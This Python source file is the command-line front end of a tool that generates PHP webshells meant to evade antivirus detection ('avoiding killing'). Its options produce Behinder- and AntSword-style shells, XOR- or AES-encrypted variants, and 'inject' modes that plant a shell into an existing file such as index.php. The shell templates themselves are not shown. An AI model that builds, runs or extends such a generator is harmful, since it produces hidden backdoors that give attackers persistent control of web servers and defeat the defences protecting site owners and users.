from construct import *
import argparse
import os
from pyfiglet import Figlet
from colorama import Fore
from itertools import zip_longest,combinations
from tqdm import tqdm

templates_for_flag3 = ['system_template','template_for_antword','template_for_antword_aes','template_for_behinder','template_for_behinder_aes','template_inject','template_inject_aes','template_inject_aes_quiet']
templates_for_flag2 = ['default','default_for_aes','behinder','behinder_for_aes','inject','inject_for_aes','inject_aes_quiet']
def render():
    font = Figlet(font='smslant')
    print(Fore.BLUE + font.renderText("avoiding killing"))

def init_generate(template,encrypt,nums,filename,tname):
    if encrypt != 'xorN':
        constructor = Constructor(template, encrypt,tname)
        constructor.generate(filename)
    else:
        constructor = ConstructorXorN(template, "xorN", nums,tname)
        constructor.generate(filename)

def check_php(filename:str):
    return filename.endswith('.php')

def check_dir():
    if not os.path.exists('./webshell'):
        os.mkdir('./webshell')

def init_template(type):
    templates = {}
    for k,v in zip_longest(templates_for_flag2,templates_for_flag3[1:]):
        templates[k] = v

    return str(templates[type[0]])

def generate_all(tname):
    check_dir()
    nums = 3
    filenames = []
    for e in encrypt_s:
        for t in templates_for_flag3:
            t1 = t.replace('template', '')
            t2 = t1.replace('_','')
            filenames.append((t,e,3,"webshell/"+t2+'_'+e+'_'+str(nums)+'.php'))

    for t,e,n,f in tqdm(filenames):
        init_generate(t,e,n,f,tname)


def engine(args):
    render()
    if args.all:
        print("starting------>")
        generate_all(args.tname)
    else:
        print("starting   (*  ^  *) ")
        for f in tqdm(args.name):
            _ = init_generate(init_template(args.type),args.key,args.nums,f,args.tname) if check_php(f)  else print("filename error")



parser = argparse.ArgumentParser(
                    prog='factory of php webshell avoided killing ',
                    description='this program can generate some php webshell which avoided killing',
                    epilog='Text at the bottom of help')

parser.add_argument('-type',dest="type",type=str,nargs=1,default='default',help="""
webshell type:
    default,
    default_for_aes,
    behinder,
    behinder_for_aes,
    inject,
    inject_for_aes,
    inject_aes_quiet
""")
parser.add_argument('-e',dest="key",type=str,default='xor2',help="""
encrypt_type:
\n\txor2,      
\n\txorN   (you must ensure you have args of n  ( -n ) existed),
\n\txor2_base64,
""")
parser.add_argument('-name',dest="name",type=str,nargs='+',default=['shell.php'],help="""
filename:
\n\tthe name of webshell you have defined.(you can provide multi filenames),
""")
parser.add_argument('-target',dest="tname",type=str,nargs='+',default=['index.php'],help="""
filename:
\n\tthe name of webshell you want to injected.(you can provide multi filenames),
""")
parser.add_argument('-n',dest='nums',type=int,nargs=1,default=2,help="""
nums:
\n\tif you choose xorN, this is the N,
""")

parser.add_argument('-all',dest='all',action='store_true',help="""
all:
\n\tgenerate all webshell,
""")

if __name__ == '__main__':
    args = parser.parse_args()
    engine(args)

